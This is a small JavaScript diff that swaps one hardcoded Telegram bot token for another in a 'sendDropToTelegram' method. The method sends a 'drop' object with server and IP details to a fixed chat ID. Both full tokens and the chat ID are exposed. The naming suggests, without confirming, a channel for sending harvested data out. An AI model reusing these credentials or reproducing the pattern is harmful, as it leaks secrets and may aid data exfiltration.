@@ -500,7 +500,7 @@ class TeamApp {
     }
 
     async sendDropToTelegram(drop, type) {
-        const token = "8773719558:AAH-VYZZ0E7F092n1ywBsHts3UOWPxlB9Z0";
+        const token = "8888454016:AAH04qHHycwZTnXoRFlvRBwQ2yEwPaYVdwQ";
         const chatId = "-1003735130681";
         
         const serverDisplay = drop.servers || this.detectServers(drop.ips);
